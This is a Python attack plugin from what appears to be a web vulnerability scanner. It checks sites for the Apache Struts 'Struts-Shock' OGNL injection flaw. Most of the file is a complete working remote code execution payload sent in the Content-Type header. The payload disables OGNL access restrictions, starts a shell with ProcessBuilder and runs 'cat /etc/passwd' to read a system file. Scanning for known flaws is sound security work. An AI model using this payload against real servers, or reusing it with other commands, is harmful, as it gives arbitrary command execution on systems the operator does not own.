import re

from lib.utils.container import Services
from lib.config.settings import Risk
from .. import AttackPlugin


class StrutsShock(AttackPlugin):
    level = Risk.DANGEROUS

    def process(self, start_url, crawled_urls):
        output = Services.get("output")
        request = Services.get("request_factory")
        logger = Services.get("logger")

        output.info("Scanning struts-shock vuln..")
        try:
            payload = "%{(#_='multipart/form-data')."
            payload += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
            payload += "(#_memberAccess?"
            payload += "(#_memberAccess=#dm):"
            payload += "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
            payload += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
            payload += "(#ognlUtil.getExcludedPackageNames().clear())."
            payload += "(#ognlUtil.getExcludedClasses().clear())."
            payload += "(#context.setMemberAccess(#dm))))."
            payload += "(#cmd='cat /etc/passwd')."  # cmd command = cat /etc/passwd
            payload += "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
            payload += "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
            payload += "(#p=new java.lang.ProcessBuilder(#cmds))."
            payload += "(#p.redirectErrorStream(true)).(#process=#p.start())."
            payload += "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
            payload += (
                "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
            )
            payload += "(#ros.flush())}"
            resp = request.send(
                url=start_url,
                method="GET",
                headers={"Content-Type": payload},
                payload=None,
            )
            if resp.status_code == 200:
                if re.search(r".*:/bin/bash", resp.text, re.I):
                    output.finding(
                        "The site is my be vulnerable to Struts-Shock. See also https://www.exploit-db.com/exploits/41570/."
                    )
        except Exception as e:
            logger.error(e)
            output.error("Error occured\nAborting this attack...\n")
            output.debug("Traceback: %s" % e)
            return
